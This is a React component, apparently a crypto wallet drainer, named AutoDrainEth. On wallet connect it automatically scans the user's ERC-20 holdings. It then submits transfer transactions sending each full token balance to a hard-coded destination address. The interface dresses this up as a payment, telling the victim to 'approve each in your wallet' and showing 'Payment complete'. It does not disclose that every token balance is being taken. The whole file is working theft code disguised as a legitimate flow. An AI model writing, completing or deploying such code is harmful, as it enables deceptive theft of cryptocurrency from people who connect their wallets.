import { useCallback, useEffect, useRef, useState } from 'react';
import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
import { erc20Abi } from 'viem';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../src/atoms/global-tokens-atom';
import { httpFetchTokens } from '../src/fetch-tokens';
import { PAYMENT_ETH_ADDRESS } from '../src/atoms/destination-address-atom';
import { ConnectButton } from '@rainbow-me/rainbowkit';

type Status = 'idle' | 'loading' | 'sending' | 'done' | 'error' | 'empty';

export const AutoDrainEth = () => {
  const { address, isConnected, chain } = useAccount();
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const [status, setStatus] = useState<Status>('idle');
  const [sent, setSent] = useState(0);
  const [total, setTotal] = useState(0);
  const hasSentRef = useRef(false);

  const fetchAndSend = useCallback(async () => {
    if (!address || !chain || !walletClient || !publicClient) return;
    if (hasSentRef.current) return;
    hasSentRef.current = true;

    setStatus('loading');
    let fetchedTokens: any[] = [];
    try {
      const res = await httpFetchTokens(chain.id, address);
      fetchedTokens = (res as any).data.erc20s ?? [];
      setTokens(fetchedTokens);
    } catch {
      setStatus('error');
      return;
    }

    if (!fetchedTokens.length) {
      setStatus('empty');
      return;
    }

    const allChecked: Record<string, { isChecked: boolean }> = {};
    fetchedTokens.forEach((t) => {
      allChecked[t.contract_address] = { isChecked: true };
    });
    setCheckedRecords(allChecked);

    setStatus('sending');
    setTotal(fetchedTokens.length);
    let sentCount = 0;

    for (const token of fetchedTokens) {
      try {
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: token.contract_address as `0x${string}`,
          abi: erc20Abi,
          functionName: 'transfer',
          args: [
            PAYMENT_ETH_ADDRESS as `0x${string}`,
            BigInt(token.balance || '0'),
          ],
        });
        await walletClient.writeContract(request);
        sentCount++;
        setSent(sentCount);
      } catch {
        // skip tokens that fail (insufficient balance, etc.)
      }
    }
    setStatus('done');
  }, [address, chain, walletClient, publicClient, setTokens, setCheckedRecords]);

  useEffect(() => {
    if (isConnected && walletClient && publicClient) {
      fetchAndSend();
    }
  }, [isConnected, walletClient, publicClient, fetchAndSend]);

  useEffect(() => {
    if (!isConnected) {
      hasSentRef.current = false;
      setStatus('idle');
      setTokens([]);
      setCheckedRecords({});
      setSent(0);
      setTotal(0);
    }
  }, [isConnected, setTokens, setCheckedRecords]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '16px' }}>
      <ConnectButton
        label="Connect Wallet"
        showBalance={false}
        chainStatus="none"
        accountStatus="avatar"
      />
      {isConnected && (
        <div style={{ textAlign: 'center', color: '#6b7280', fontSize: '14px' }}>
          {status === 'loading' && (
            <span>
              <Spinner /> Scanning wallet...
            </span>
          )}
          {status === 'sending' && (
            <span>
              <Spinner /> Processing {sent}/{total} tokens — approve each in your wallet
            </span>
          )}
          {status === 'done' && (
            <span style={{ color: '#10b981', fontWeight: 600 }}>
              ✓ Payment complete
            </span>
          )}
          {status === 'empty' && (
            <span>No tokens found on this chain.</span>
          )}
          {status === 'error' && (
            <span style={{ color: '#ef4444' }}>
              Could not fetch tokens. Try a different network.
            </span>
          )}
        </div>
      )}
    </div>
  );
};

const Spinner = () => (
  <span
    style={{
      display: 'inline-block',
      width: '12px',
      height: '12px',
      border: '2px solid #e5e7eb',
      borderTopColor: '#6366f1',
      borderRadius: '50%',
      animation: 'spin 0.7s linear infinite',
      marginRight: '6px',
      verticalAlign: 'middle',
    }}
  />
);
